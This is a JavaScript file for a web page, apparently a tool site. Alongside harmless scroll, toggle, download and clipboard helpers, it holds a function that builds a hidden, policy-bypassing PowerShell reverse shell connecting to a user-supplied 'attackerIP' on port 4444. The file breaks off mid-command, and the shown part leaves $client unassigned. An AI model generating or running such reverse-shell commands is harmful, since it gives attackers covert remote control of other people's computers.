document.addEventListener("DOMContentLoaded", () => {
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      console.log(entry);
      if (entry.isIntersecting) {
        entry.target.classList.add('show');
      } else {
        entry.target.classList.remove('show');
      }
    });
  });

  const sectionsToObserve = document.querySelectorAll(".hidden");

  sectionsToObserve.forEach((section) => {
    observer.observe(section);
  });
});

function toggleReadMore(button) {
  const content = button.previousElementSibling;
  if (content.style.maxHeight === "0px" || content.style.maxHeight === "") {
      content.style.maxHeight = content.scrollHeight + "px";
      button.classList.remove("collapsed");
      button.classList.add("expanded");
  } else {
      content.style.maxHeight = "0";
      button.classList.remove("expanded");
      button.classList.add("collapsed");
  }
}

function downloadFiles() {
  var secondFileLink = document.createElement('a');
  secondFileLink.href = 'matrix.txt';
  secondFileLink.download = 'matrix.txt';
  document.body.appendChild(secondFileLink);
  secondFileLink.click();
  document.body.removeChild(secondFileLink);
}

// Beispiel: script.js



function copyToClipboard(elementId) {
  const copyText = document.getElementById(elementId).innerText;
  navigator.clipboard.writeText(copyText)
    .then(() => alert('Copied to clipboard'))
    .catch((err) => alert('Failed to copy text: ' + err));
}

function generatePowerShellCommand() {
  const attackerIP = document.getElementById('attackerIP').value.trim();
  if (!attackerIP) {
    alert('Please enter a valid IP address.');
    return;
  }
  const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "` +
    `New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);` +
    `$stream = $client.GetStream();` +
    `[byte[]]$
